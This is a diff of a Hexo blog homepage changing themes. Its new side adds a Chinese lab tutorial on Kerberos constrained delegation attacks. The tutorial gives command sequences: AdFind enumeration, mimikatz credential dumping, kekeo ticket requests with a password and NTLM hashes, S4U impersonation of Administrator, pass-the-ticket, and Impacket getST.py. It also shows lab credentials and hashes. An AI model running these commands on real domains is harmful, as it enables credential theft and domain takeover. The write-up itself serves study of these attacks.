@@ -1,14 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-  <meta charset="utf-8">
-  <meta name="baidu-site-verification" content="L6Lm9d5Crl"/>
-  
-  
-  
-  
-  <title>林中小屋</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
   <meta property="og:type" content="website">
 <meta property="og:title" content="林中小屋">
 <meta property="og:url" content="http://antipassion.github.io/index.html">
@@ -16,270 +27,534 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="Nayon|1163875625@qq.com">
 <meta name="twitter:card" content="summary">
-  
-    <link rel="alternative" href="/atom.xml" title="林中小屋" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/img/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+<link rel="canonical" href="http://antipassion.github.io/">
 
-  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
-  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
-  
-    
-    
-  
-  
-      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  
-  <!-- 加载特效 -->
-    <script src="/js/pace.js"></script>
-    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
-  <script>
-      var yiliaConfig = {
-          fancybox: true,
-          animate: true,
-          isHome: true,
-          isPost: false,
-          isArchive: false,
-          isTag: false,
-          isCategory: false,
-          open_in_new: false
-      }
-  </script>
-<meta name="generator" content="Hexo 5.4.0"></head>
-<body>
-  <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-    <header id="header" class="inner">
-        
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
-        <a href="/" class="profilepic">
-            
-            <img lazy-src="/img/avatar.png" class="js-avatar">
-            
-        </a>
-        <hgroup>
-          <h1 class="header-author"><a href="/"></a></h1>
-        </hgroup>
-        
-        
-            <form>
-                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
-            </form>
-            <div id="local-search-result"></div>
-        
-        
-            <script type="text/javascript">
-                (function() {
-                    'use strict';
-                    function getMatchData(keyword, data) {
-                        var matchData = [];
-                        for(var i =0;i<data.length;i++){
-                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
-                                matchData.push(data[i])
-                        }
-                        return matchData;
-                    }
-                    var $input = $('#local-search-input');
-                    var $resultContent = $('#local-search-result');
-                    $input.keyup(function(){
-                        $.ajax({
-                            url: '/search.json',
-                            dataType: "json",
-                            success: function( json ) {
-                                var str='<ul class=\"search-result-list\">';                
-                                var keyword = $input.val().trim().toLowerCase();
-                                $resultContent.innerHTML = "";
-                                if ($input.val().trim().length <= 0) {
-                                    $resultContent.empty();
-                                    $('#switch-area').show();
-                                    return;
-                                }
-                                var results = getMatchData(keyword, json);
-                                if(results.length === 0){
-                                    $resultContent.empty();
-                                    $('#switch-area').show();
-                                    return;
-                                } 
-                                for(var i =0; i<results.length; i++){
-                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
-                                }
-                                str += "</ul>";
-                                $resultContent.empty();
-                                $resultContent.append(str);
-                                $('#switch-area').hide();
-                            }
-                        });
-                    });
-                })();
-            </script>
-        
-        
-            <div id="switch-btn" class="switch-btn">
-                <div class="icon">
-                    <div class="icon-ctn">
-                        <div class="icon-wrap icon-house" data-idx="0">
-                            <div class="birdhouse"></div>
-                            <div class="birdhouse_holes"></div>
-                        </div>
-                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                            <div class="ribbon"></div>
-                        </div>
-                        
-                        <div class="icon-wrap icon-link hide" data-idx="2">
-                            <div class="loopback_l"></div>
-                            <div class="loopback_r"></div>
-                        </div>
-                        
-                        
-                    </div>
-                </div>
-                <div class="tips-box hide">
-                    <div class="tips-arrow"></div>
-                    <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
-                        
-                        <li>友情链接</li>
-                        
-                        
-                    </ul>
-                </div>
-            </div>
-        
-        <div id="switch-area" class="switch-area">
-            <div class="switch-wrap">
-                <section class="switch-part switch-part1">
-                    <nav class="header-menu">
-                        <ul>
-                        
-                            <li><a  href="/archives/">主页</a></li>
-                        
-                            <li><a  href="/archives/">所有文章</a></li>
-                        
-                            <li><a  href="/Nayon">author</a></li>
-                        
-                        </ul>
-                    </nav>
-                    <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fl mailto"  target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
-                            
-                        </ul>
-                    </nav>
-                </section>
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/PE%E7%BB%93%E6%9E%84/" style="font-size: 20px;">PE结构</a> <a href="/tags/ctf/" style="font-size: 13.33px;">ctf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 16.67px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
-                    </div>
-                </section>
-                
-                
-                <section class="switch-part switch-part3">
-                    <div id="js-friends">
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://fk0x075.github.io/">117</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://alikon.art/">Nagarita</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://0range-x.github.io/">0r@nge</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://txluck.github.io/">永安寺</a>
-                    
-                    </div>
-                </section>
-                
-                
-            </div>
-        </div>
-    </header>
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : true,
+    isPost : false,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>林中小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">林中小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
 </div>
 
-    </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-      <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页"></a></h1>
-      </div>
-    <div class="intrude-less">
-        <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                
-                    <img lazy-src="/img/avatar.png" class="js-avatar">
-                
-            </a>
-            <hgroup>
-              <h1 class="header-author"><a href="/" title="回到主页"></a></h1>
-            </hgroup>
-            
-            <nav class="header-menu">
-                <ul>
-                
-                    <li><a href="/archives/">主页</a></li>
-                
-                    <li><a href="/archives/">所有文章</a></li>
-                
-                    <li><a href="/Nayon">author</a></li>
-                
-                <div class="clearfix"></div>
-                </ul>
-            </nav>
-            <nav class="header-nav">
-                <div class="social">
-                    
-                        <a class="mailto" target="_blank" href="/1163875625@qq.com" title="mailto">mailto</a>
-                    
-                </div>
-            </nav>
-        </header>
-    </div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-PE结构-PE文件的两种状态" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/" class="article-date">
-      <time datetime="2021-11-16T06:50:09.000Z" itemprop="datePublished">2021-11-16</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/">PE结构-PE文件的两种状态</a>
-    </h1>
-  
 
 
-      </header>
-      
+
+
+</div>
+    </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
-      
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
           
-        <p>本文的是学习复现自吾爱破解dalao <a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1393291-1-1.html">lyl610abc</a>的PE文件解析系列，非本人原创，属于学习笔记(大佬yyds!)。</p>
+
+          <div class="content index posts-expand">
+            
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Nayon|1163875625@qq.com">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">约束委派攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-09 23:21:05" itemprop="dateCreated datePublished" datetime="2022-01-09T23:21:05+08:00">2022-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-21 21:40:26" itemprop="dateModified" datetime="2022-01-21T21:40:26+08:00">2022-01-21</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p>接上述的非约束委派，由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to  Self）和S4U2Proxy（Service for User to Proxy）的Kerberos协议扩展。</p>
+<p><strong>流程:</strong></p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220109233827841.png" alt="image-20220109233827841"></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1.用户向Service1发送请求</span><br><span class="line"></span><br><span class="line">2.这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。</span><br><span class="line"></span><br><span class="line">3.KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。</span><br><span class="line"></span><br><span class="line">4.Service1在步骤3使用模拟用户申请KDC所获得的ST1票据与User进行验证，然后响应用户的请求。</span><br><span class="line"></span><br><span class="line">注:这个过程其实Service1是获得了用户的ST1和TGT的，但是，S4U2Self扩展不允许Service1去代表用户请求其他服务。</span><br><span class="line"></span><br><span class="line">5.用户再次向Service1发起请求，此时Service1需要以用户的身份去访问Service2.此处官方文档提到了两点。</span><br><span class="line"></span><br><span class="line">	A。Service1已经通过验证，并且有一个有效的TGT。</span><br><span class="line"></span><br><span class="line">	B。Service1有从用户到Service1的forwardableST（可转发ST），此处我认为，根据流程来看，可转发ST1其实就是ST1，用于(6)的验证</span><br><span class="line"></span><br><span class="line">6.Service1代表用户向Service2请求一个用于认证Service2的ST(称之为ST2)。用户在ST1中通过cname (client name) 和crealm(client name)进行标示。</span><br><span class="line"></span><br><span class="line">7.KDC接收到(6)中的请求后，对PAC的数字签名进行验证。如果验证成功或这个请求没有PAC（无法验证失败）,KDC将返回ST2给service1,不过这个ST2中的cname crealm标示的是用户而不是service1。</span><br><span class="line"></span><br><span class="line">8.service1代表用户使用ST2请求访问Service2</span><br><span class="line"></span><br><span class="line">9.Service2响应Service1的请求</span><br><span class="line"></span><br><span class="line">10.Service1将Service2的响应转发给User。</span><br></pre></td></tr></table></figure>
+
+<p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p>
+<p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p>
+<h4 id="前期准备："><a href="#前期准备：" class="headerlink" title="前期准备："></a><strong>前期准备</strong>：</h4><p>​    域控机为域用户配置SPN，用于域用户配置约束委派</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A SQL/test win2016</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205432579.png" alt="image-20220116205432579"></p>
+<p>此时在Active Directory 用户和计算机处，可以发现域用户win2016已经可以配置委派了。</p>
+<p>为win2016用户配置约束委派，做win2019机器的cifs服务的委派</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205616253.png" alt="image-20220116205616253"></p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116205819779.png" alt="image-20220116205819779"></p>
+<p>此时应用设置后，已在域中完成了win2016用户对win2019机器的cifs服务的委派</p>
+<h4 id="发现约束委派"><a href="#发现约束委派" class="headerlink" title="发现约束委派:"></a>发现约束委派:</h4><p>使用Adfind.exe尝试发现约束委派</p>
+<h6 id="查找域中配置约束委派用户"><a href="#查找域中配置约束委派用户" class="headerlink" title="查找域中配置约束委派用户"></a>查找域中配置约束委派用户</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210212550.png" alt="image-20220116210212550"></p>
+<p>发现win2016用户存在约束委派，委派了win2019机器的cifs服务</p>
+<h6 id="在域中查找配置了约束委派主机"><a href="#在域中查找配置了约束委派主机" class="headerlink" title="在域中查找配置了约束委派主机"></a>在域中查找配置了约束委派主机</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212912030.png" alt="image-20220116212912030"></p>
+<p>可以看到主机Win2016存在约束委派，委派了win2019机器的cifs服务</p>
+<h4 id="攻击利用："><a href="#攻击利用：" class="headerlink" title="攻击利用："></a>攻击利用：</h4><h5 id="域用户存在约束委派"><a href="#域用户存在约束委派" class="headerlink" title="域用户存在约束委派:"></a><strong>域用户存在约束委派:</strong></h5><h6 id="kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户明文密码申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户明文密码申请可转发的TGT票据</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /password:Admin#123</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116210849880.png" alt="image-20220116210849880"></p>
+<h6 id="kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"><a href="#kekeo-exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据" class="headerlink" title="kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据"></a>kekeo.exe结合存在约束委派的域用户的NTLM申请可转发的TGT票据</h6><p>利用mimikatz拿到域用户win2016的NTLM hash进行利用</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211127487.png" alt="image-20220116211127487"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # tgt::ask /user:win2016 /domain:vulntarget.com /NTLM:dfc8d2bfa540a0a6e2248a82322e654e</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211348121.png" alt="image-20220116211348121"></p>
+<h6 id="利用kekeo进行S4U伪造"><a href="#利用kekeo进行S4U伪造" class="headerlink" title="利用kekeo进行S4U伪造"></a>利用kekeo进行S4U伪造</h6><p>利用拿到的TGT票据通过伪造s4u请求以administrator用户身份请求访问域控机的cifs服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_win2016@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211749435.png" alt="image-20220116211749435"></p>
+<h6 id="PTT利用拿到的TGS票据"><a href="#PTT利用拿到的TGS票据" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><p>通过mimikatz进行ptt拿到域控机的cifs服务使用权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116211914613.png" alt="image-20220116211914613"></p>
+<p>注:此处使用的通过S4U2proxy 拿到的 TGS票据，而不是使用通过S4U2self拿到的TGS票据。</p>
+<p>查看域控机的共享目录成功！</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116212122245.png" alt="image-20220116212122245"></p>
+<h5 id="域主机存在约束委派"><a href="#域主机存在约束委派" class="headerlink" title="域主机存在约束委派:"></a>域主机存在约束委派:</h5><p>通过mimikatz拿到域主机win2016的服务账户NTLM hash来申请可转发的TGT票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>注:需要管理员权限才可拿到密码Hash</p>
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213302798.png" alt="image-20220116213302798"></p>
+<h6 id="kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"><a href="#kekeo-exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT" class="headerlink" title="kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT"></a>kekeo.exe结合存在约束委派的域主机的服务账户的NTLM申请可转发的TGT</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:win2016$ /domain:vulntarget.com /NTLM:e0cd419213811fd910ca6c3c42d764e7</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116213633756.png" alt="image-20220116213633756"></p>
+<p>注:带有$符号的用户一般都是服务主机账户，而非普通用户</p>
+<h6 id="通过kekeo进行S4U伪造"><a href="#通过kekeo进行S4U伪造" class="headerlink" title="通过kekeo进行S4U伪造"></a>通过kekeo进行S4U伪造</h6><p>如此，成功拿到了对应委派服务的TGS票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo # tgs::s4u /tgt:TGT_win2016$@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/win2019.vulntarget.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214205656.png" alt="image-20220116214205656"></p>
+<h6 id="PTT利用拿到的TGS票据-1"><a href="#PTT利用拿到的TGS票据-1" class="headerlink" title="PTT利用拿到的TGS票据"></a>PTT利用拿到的TGS票据</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~win2019.vulntarget.com@VULNTARGET.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214345566.png" alt="image-20220116214345566"></p>
+<p>尝试对域控进行共享目录访问,利用成功！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\win2019.vulntarget.com\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB.assets/image-20220116214439465.png" alt="image-20220116214439465"></p>
+<p>注: 此处进行tgs::s4u伪造时，申请的service是cifs/win2019.vulntarget.com时；我们在使用时就应该是dir \win2019.vulntarget.com\c$ 这样才能访问成功，若dir \win2019\c$则会访问失败，反之亦然！</p>
+<h4 id="域外利用"><a href="#域外利用" class="headerlink" title="域外利用"></a>域外利用</h4><h5 id="域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令"><a href="#域外使用adfind发现非约束-约束委派主机或用户时，可使用如下命令" class="headerlink" title="域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:"></a>域外使用adfind发现非约束/约束委派主机或用户时，可使用如下命令:</h5><h6 id="在域外探测存在约束委派的域用户账户"><a href="#在域外探测存在约束委派的域用户账户" class="headerlink" title="在域外探测存在约束委派的域用户账户:"></a>在域外探测存在约束委派的域用户账户:</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>
+
+<h6 id="在域外探测存在约束委派的域主机"><a href="#在域外探测存在约束委派的域主机" class="headerlink" title="在域外探测存在约束委派的域主机:"></a>在域外探测存在约束委派的域主机:</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.0.10.110 -u vulntarget\win2019 -up admin#123 -b &quot;DC=vulntarget,DC=com&quot; -f &quot;(&amp;(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=16777216))&quot; msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>
+
+<h5 id="域外通过getST-py进行约束委派攻击"><a href="#域外通过getST-py进行约束委派攻击" class="headerlink" title="域外通过getST.py进行约束委派攻击"></a><strong>域外通过getST.py进行约束委派攻击</strong></h5><p>(可通过隧道，需提前通过hosts文件绑定ip与主机名)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -hashes :b223fae09b86d75482d2c61ac5f773fe -spn cifs/win2019.vulntarget.com -impersonate administrator vulntarget/win2016$ -dc-ip 10.0.10.110</span><br></pre></td></tr></table></figure>
+
+<p>-hashes:  NTLM hash</p>
+<p>-spn: 约束委派指定的服务</p>
